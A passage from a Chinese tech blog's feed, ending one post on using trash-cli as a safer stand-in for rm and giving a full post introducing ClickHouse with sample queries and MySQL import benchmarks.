title="功能说明："></a>功能说明：</h6><ul><li>trash-put     将文件或目录移入回收站</li><li>trash-empty   清空回收站</li><li>trash-list    列出回收站中的文件</li><li>trash-restore 还原回收站中的文件</li><li>trash-rm      删除回首站中的单个文件</li></ul><h6 id="用它替代-rm命令"><a href="#用它替代-rm命令" class="headerlink" title="用它替代 rm命令"></a>用它替代 rm命令</h6><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim .bashrc </span></span><br><span class="line"><span class="comment"># .bashrc</span></span><br><span class="line"><span class="comment">#alias rm='rm -i'</span></span><br><span class="line"><span class="built_in">alias</span> rm=<span class="string">'trash-put'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h2><h4 id="删除测试："><a href="#删除测试：" class="headerlink" title="删除测试："></a>删除测试：</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rm -rf dump.sql</span></span><br><span class="line"><span class="comment"># ll ~/.local/share/Trash/files </span></span><br><span class="line">-rw-r--r-- 1 root root 123 Jul 17  2018 dump.sql</span><br><span class="line"> </span><br><span class="line"><span class="comment"># trash-list</span></span><br><span class="line">2019-02-02 18:02:33 /root/dump.sql</span><br></pre></td></tr></tbody></table></figure><h4 id="还原删除的文件"><a href="#还原删除的文件" class="headerlink" title="还原删除的文件"></a>还原删除的文件</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># trash-restore /root/dump.rdb</span></span><br><span class="line">   0 2019-02-02 18:01:08 /root/dump.sql.bak</span><br><span class="line">   1 2019-02-02 18:02:33 /root/dump.sql</span><br><span class="line">What file to restore [0..1]: 1</span><br><span class="line"></span><br><span class="line">还原成功</span><br><span class="line"><span class="comment"># ll /root/dump.rdb </span></span><br><span class="line">-rw-r--r-- 1 root root 123 Jul 17  2018 /root/dump.sql</span><br></pre></td></tr></tbody></table></figure><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><h4 id="trash-put命令会把我们想要删除的文件移动到-local-share-Trash-files-中。相关信息记录在-local-share-Trash-info中。"><a href="#trash-put命令会把我们想要删除的文件移动到-local-share-Trash-files-中。相关信息记录在-local-share-Trash-info中。" class="headerlink" title="trash-put命令会把我们想要删除的文件移动到~/.local/share/Trash/files 中。相关信息记录在~/.local/share/Trash/info中。"></a>trash-put命令会把我们想要删除的文件移动到~/.local/share/Trash/files 中。相关信息记录在~/.local/share/Trash/info中。</h4><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h4 id=&quot;搞过运维想过行业的淫们都有过rm之伤，造成血的教训。为了避免以后才出现类似的情况，强烈建议生产环境中千万不要使用rm-rf-这种操
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>ClickHouse-sync-to-MySQLDate</title>
    <link href="https://jiemin.wang/2019/03/20/ClickHouse-sync-to-MySQLDate/"/>
    <id>https://jiemin.wang/2019/03/20/ClickHouse-sync-to-MySQLDate/</id>
    <published>2019-03-20T02:27:04.000Z</published>
    <updated>2019-03-20T03:45:10.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>ClickHouse 这款产品大家都听说过很快，但是到底有多恐怖？</li><li>ClickHouse 到底是什么？</li></ul><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ClickHouse最初是为 Yandex.Metrica 世界第二大Web分析平台 而开发的。多年来一直作为该系统的核心组件被该系统持续使用着。目前为止，该系统在ClickHouse中有超过13万亿条记录，并且每天超过200多亿个事件被处理。它允许直接从原始数据中动态查询并生成报告。本文简要介绍了ClickHouse在其早期发展阶段的目标。</p><p>Yandex.Metrica基于用户定义的字段，对实时访问、连接会话，生成实时的统计报表。这种需求往往需要复杂聚合方式，比如对访问用户进行去重。构建报表的数据，是实时接收存储的新数据。</p><p>截至2014年4月，Yandex.Metrica每天跟踪大约120亿个事件（用户的点击和浏览）。为了可以创建自定义的报表，我们必须存储全部这些事件。同时，这些查询可能需要在几百毫秒内扫描数百万行的数据，或在几秒内扫描数亿行的数据。</p><h4 id="什么是ClickHouse"><a href="#什么是ClickHouse" class="headerlink" title="什么是ClickHouse ?"></a><strong>什么是ClickHouse ?</strong></h4><p>ClickHouse 是面向 OLAP 的分布式列式 DBMS.</p><h4 id="ClickHouse的显著特性"><a href="#ClickHouse的显著特性" class="headerlink" title="ClickHouse的显著特性"></a>ClickHouse的显著特性</h4><ul><li>真正的面向列的DBMS</li><li>数据高效压缩</li><li>磁盘存储的数据</li><li>多核并行处理</li></ul><ul><li>在多个服务器上分布式处理<ul><li>SQL语法支持</li></ul></li></ul><ul><li>向量化引擎</li><li>实时数据更新</li><li>索引</li><li>适合在线查询</li><li>支持近似预估计算</li><li>支持嵌套的数据结构</li><li>支持数组作为数据类型</li><li>支持限制查询复杂性以及配额</li><li>复制数据复制和对数据完整性的支持</li></ul><h4 id="OLAP场景的关键特征"><a href="#OLAP场景的关键特征" class="headerlink" title="OLAP场景的关键特征"></a>OLAP场景的关键特征</h4><ul><li>大多数是读请求</li><li>数据总是以相当大的批(> 1000 rows)进行写入</li><li>不修改已添加的数据</li><li>每次查询都从数据库中读取大量的行，但是同时又仅需要少量的列</li><li>宽表，即每个表包含着大量的列</li><li>较少的查询(通常每台服务器每秒数百个查询或更少)</li><li>对于简单查询，允许延迟大约50毫秒</li><li>列中的数据相对较小： 数字和短字符串(例如，每个URL 60个字节)</li><li>处理单个查询时需要高吞吐量（每个服务器每秒高达数十亿行）</li><li>事务不是必须的</li><li>对数据一致性要求低</li><li>每一个查询除了一个大表外都很小</li><li>查询结果明显小于源数据，换句话说，数据被过滤或聚合后能够被盛放在单台服务器的内存中</li></ul><h4 id="列式数据库更适合OLAP场景的原因"><a href="#列式数据库更适合OLAP场景的原因" class="headerlink" title="列式数据库更适合OLAP场景的原因"></a>列式数据库更适合OLAP场景的原因</h4><p>列式数据库更适合于OLAP场景(对于大多数查询而言，处理速度至少提高了100倍)，下面详细解释了原因(通过图片更有利于直观理解)：<br>行式<br><img src="/2019/03/20/ClickHouse-sync-to-MySQLDate/row_oriented.gif" title="row_oriented"><br>列式<br><img src="/2019/03/20/ClickHouse-sync-to-MySQLDate/column_oriented.gif" title="column_oriented"><br>看到差别了么？下面将详细介绍为什么会发生这种情况。<br>1.针对分析类查询，通常只需要读取表的一小部分列。在列式数据库中你可以只读取你需要的数据。例如，如果只需要读取100列中的5列，这将帮助你最少减少20倍的I/O消耗。<br>2.由于数据总是打包成批量读取的，所以压缩是非常容易的。同时数据按列分别存储这也更容易压缩。这进一步降低了I/O的体积。<br>3.由于I/O的降低，这将帮助更多的数据被系统缓存。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ clickhouse-client</span><br><span class="line">ClickHouse client version 0.0.52053.</span><br><span class="line">Connecting to localhost:9000.</span><br><span class="line">Connected to ClickHouse server version 0.0.52053.</span><br><span class="line"></span><br><span class="line">:) SELECT CounterID, count() FROM hits GROUP BY CounterID ORDER BY count() DESC LIMIT 20</span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">    CounterID,</span><br><span class="line">    count()</span><br><span class="line">FROM hits</span><br><span class="line">GROUP BY CounterID</span><br><span class="line">ORDER BY count() DESC</span><br><span class="line">LIMIT 20</span><br><span class="line"></span><br><span class="line">┌─CounterID─┬──count()─┐</span><br><span class="line">│    114208 │ 56057344 │</span><br><span class="line">│    115080 │ 51619590 │</span><br><span class="line">│      3228 │ 44658301 │</span><br><span class="line">│     38230 │ 42045932 │</span><br><span class="line">│    145263 │ 42042158 │</span><br><span class="line">│     91244 │ 38297270 │</span><br><span class="line">│    154139 │ 26647572 │</span><br><span class="line">│    150748 │ 24112755 │</span><br><span class="line">│    242232 │ 21302571 │</span><br><span class="line">│    338158 │ 13507087 │</span><br><span class="line">│     62180 │ 12229491 │</span><br><span class="line">│     82264 │ 12187441 │</span><br><span class="line">│    232261 │ 12148031 │</span><br><span class="line">│    146272 │ 11438516 │</span><br><span class="line">│    168777 │ 11403636 │</span><br><span class="line">│   4120072 │ 11227824 │</span><br><span class="line">│  10938808 │ 10519739 │</span><br><span class="line">│     74088 │  9047015 │</span><br><span class="line">│    115079 │  8837972 │</span><br><span class="line">│    337234 │  8205961 │</span><br><span class="line">└───────────┴──────────┘</span><br><span class="line"></span><br><span class="line">20 rows <span class="keyword">in</span> <span class="built_in">set</span>. Elapsed: 0.153 sec. Processed 1.00 billion rows, 4.00 GB (6.53 billion rows/s., 26.10 GB/s.)</span><br><span class="line"></span><br><span class="line">:)</span><br></pre></td></tr></tbody></table></figure><h4 id="ClickHouse-SQL"><a href="#ClickHouse-SQL" class="headerlink" title="ClickHouse SQL"></a>ClickHouse SQL</h4><p>Creating a Table<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE [IF NOT EXISTS] [db.]table_name [ON CLUSTER cluster]</span><br><span class="line">(</span><br><span class="line">    name1 [type1] [DEFAULT|MATERIALIZED|ALIAS expr1],</span><br><span class="line">    name2 [type2] [DEFAULT|MATERIALIZED|ALIAS expr2],</span><br><span class="line">    ...</span><br><span class="line">    INDEX index_name1 expr1 TYPE type1(...) GRANULARITY value1,</span><br><span class="line">    INDEX index_name2 expr2 TYPE type2(...) GRANULARITY value2</span><br><span class="line">) ENGINE = MergeTree()</span><br><span class="line">[PARTITION BY expr]</span><br><span class="line">[ORDER BY expr]</span><br><span class="line">[PRIMARY KEY expr]</span><br><span class="line">[SAMPLE BY expr]</span><br><span class="line">[SETTINGS name=value, ...]</span><br></pre></td></tr></tbody></table></figure><p></p><p>Example of sections setting<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENGINE MergeTree() PARTITION BY toYYYYMM(EventDate) ORDER BY (CounterID, EventDate, intHash32(UserID)) SAMPLE BY intHash32(UserID) SETTINGS index_granularity=8192</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="MySQL-数据导入测试"><a href="#MySQL-数据导入测试" class="headerlink" title="MySQL 数据导入测试"></a>MySQL 数据导入测试</h2><h4 id="测试一"><a href="#测试一" class="headerlink" title="测试一"></a>测试一</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># du出的表大小</span></span><br><span class="line">5.5G    test_1.ibd</span><br><span class="line"><span class="comment"># ClickHouse操作语句</span></span><br><span class="line">CREATE TABLE test_1</span><br><span class="line">ENGINE = MergeTree</span><br><span class="line">ORDER BY id AS</span><br><span class="line">SELECT *</span><br><span class="line">FROM mysql(<span class="string">'host:port'</span>, <span class="string">'dbtest'</span>, <span class="string">'test_1'</span>, <span class="string">'user'</span>, <span class="string">'password'</span>) </span><br><span class="line"><span class="comment"># 耗时和平均速度</span></span><br><span class="line">0 rows <span class="keyword">in</span> <span class="built_in">set</span>. Elapsed: 137.251 sec. Processed 18.59 million rows, 7.34 GB (135.43 thousand rows/s., 53.48 MB/s.)</span><br></pre></td></tr></tbody></table></figure><h4 id="测试二"><a href="#测试二" class="headerlink" title="测试二"></a>测试二</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另一个表</span></span><br><span class="line">20G     test_2.ibd</span><br><span class="line">CREATE TABLE test_2</span><br><span class="line">ENGINE = MergeTree</span><br><span class="line">ORDER BY id AS</span><br><span class="line">SELECT *</span><br><span class="line">FROM mysql(<span class="string">'host:port'</span>, <span class="string">'dbtest'</span>, <span class="string">'test_2'</span>, <span class="string">'user'</span>, <span class="string">'password'</span>) </span><br><span class="line"><span class="comment"># 不知道为啥这表这么快就导入了 貌似是行少，但是表的总大小大啊</span></span><br><span class="line">0 rows <span class="keyword">in</span> <span class="built_in">set</span>. Elapsed: 44.389 sec. Processed 13.03 million rows, 1.44 GB (293.44 thousand rows/s., 32.35 MB/s.)</span><br></pre></td></tr></tbody></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://clickhouse.yandex/docs/zh/" target="_blank" rel="noopener">ClickHouse 官方资料</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ClickHouse 这款产品大家都听说过很快，但是到底有多恐怖？&lt;/li&gt;
&lt;li&gt;ClickHouse 到底是什么？&lt;/li
      
    
    </summary>
    
      <category term="ClickHouse" scheme="https://jiemin.wang/categories/ClickHouse/"/>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/ClickHouse/MySQL/"/>
    
    
      <category term="ClickHouse" scheme="https://jiemin.wang/tags/ClickHouse/"/>
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
</feed>
